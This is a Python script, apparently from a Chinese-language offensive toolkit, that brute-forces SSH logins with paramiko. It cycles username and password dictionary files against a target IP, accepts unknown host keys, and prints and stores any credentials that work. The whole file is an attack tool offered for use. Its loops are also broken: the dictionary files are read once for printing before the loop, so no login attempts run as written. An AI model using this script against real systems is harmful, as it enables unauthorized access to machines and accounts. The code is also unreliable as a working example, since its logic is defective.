#!/usr/bin/python3
# -*- coding: utf-8 -*-

import json
from optparse import OptionParser
import traceback
import paramiko

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

UserDic = "user.txt"
PasswordDic = "pass.txt"

# FIXME
# python SSH身份认证攻击武器.py --target 10.0.4.148 --user user.txt --pw pass.txt
def SSHLogin(target, username, password):
    try:
        s = paramiko.SSHClient()
        # 接受不在本地Known_host文件下的主机
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(target, 22, username, password, timeout=1.5)
        s.close()
        print(("The username is %s and password is %s" % (username, password)))
        ret['status'] = 'success'
        ret['info'].append({'username': username, 'password': password})
    except:
        traceback.print_exc()


def attack():
    usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target", help="SSH server target, e.g. 10.0.0.1")
    parse.add_option("-u", '--user', type="string", dest="username", default="user.txt",
                     help="SSHLogin user name dict, e.g. user.txt")
    parse.add_option("-p", '--pw', type="string", dest="password", default="pass.txt",
                     help="SSHLogin password dict, e.g. pass.txt")
    options, args = parse.parse_args()

    if not options.target:
        ret['status'] = "fail"
        return json.dumps(ret)

    # 默认字典在当前目录下
    if not options.username:
        usernameFile = open(UserDic, "r")
    else:
        usernameFile = open(options.username, "r")

    if not options.password:
        passwordFile = open(PasswordDic, "r")
    else:
        passwordFile = open(options.password, "r")

    print(usernameFile.readlines())
    print(passwordFile.readlines())

    print(options.target)
    # SSHLogin(options.target, "root", "123456")
    for user in usernameFile.readlines():
        for passwd in passwordFile.readlines():
            un = user.strip('\n')
            pw = passwd.strip('\n')
            print(un, pw)
            SSHLogin(options.target, un, pw)

    return json.dumps(ret)


if __name__ == '__main__':
    attack()
